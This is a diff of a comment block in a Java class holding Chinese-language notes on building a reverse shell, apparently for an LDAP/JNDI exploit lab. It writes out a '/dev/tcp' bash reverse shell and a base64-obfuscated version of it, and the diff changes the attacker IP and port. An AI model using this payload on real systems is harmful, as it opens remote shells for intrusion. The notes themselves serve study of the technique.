@@ -195,7 +195,7 @@ public class Summary1 {
      * 直接使用bash -i可能会显示 zsh目录不存在
      * 就给bash -i用base 64加密
      * # /bin/bash -i >& /dev/tcp/192.168.35.152/7777 0>&1
-     * bash -c '{echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMzUuMTUyLzc3NzcgMD4mMSAgIA==}|{base64,-d}|{bash,-i}'
+     * bash -c '{echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMTM2LjEzMC8xMjM0IDA+JjE=}|{base64,-d}|{bash,-i}'
      * 中间那块加密部分就是上面注释的语句（可以自己解码看看）
      *
      * 开启LDAP服务
